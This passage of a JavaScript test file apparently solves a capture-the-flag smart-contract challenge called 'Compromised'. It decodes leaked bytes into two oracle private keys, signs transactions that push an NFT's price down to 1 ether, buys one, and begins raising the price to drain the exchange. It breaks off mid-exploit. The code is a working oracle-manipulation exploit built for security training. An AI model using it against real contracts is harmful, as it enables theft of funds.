...
const bytesToAscii = (bytes) =>
  bytes
    .split(" ")
    .map((byte) => web3.utils.hexToAscii("0x" + byte))
    .join("");
const base64ToHex = (base64) => Buffer.from(base64, "base64").toString();
const decodingPrivkey = (bytes) => base64ToHex(bytesToAscii(bytes));
const settingPriceData = (symbol, newPrice) => {
...
describe("Compromised challenge", function () {
  ...
  it("Exploit", async function () {
    ...
    const privKey1 = decodingPrivkey(privKeyBytes1);
    const privKey2 = decodingPrivkey(privKeyBytes2);
    ...
    // Setting lower price
    let signedTxn1 = await account1.signTransaction({
        to: this.oracle.address,
        gas: 1e6,
        data: settingPriceData(tokenSymbol, ether('1').toString())
    });
    let signedTxn2 = await account2.signTransaction({
        to: this.oracle.address,
        gas: 1e6,
        data: settingPriceData(tokenSymbol, ether('1').toString())
    });
    await web3.eth.sendSignedTransaction(signedTxn1.rawTransaction)
    await web3.eth.sendSignedTransaction(signedTxn2.rawTransaction)

    // Buying NFT
    await this.exchange.buyOne({from: attacker, value: ether("1").toString()});

    // Setting higher price
    const exchangeBalance = await balance.current(this.exchange.address);
    signedTxn1 = await account1.signTransaction({
        to: this.oracle.address,
        gas: 1e6,
        data: settingPriceData(tokenSymbol, exchangeBalance.toString())
    });
    signedTxn2 = await account2.signTransaction({
        to: this.oracle.address,
        gas: 1e6,
        data: settingPriceData(tokenSymbol, exchangeBalance.toString())
    });
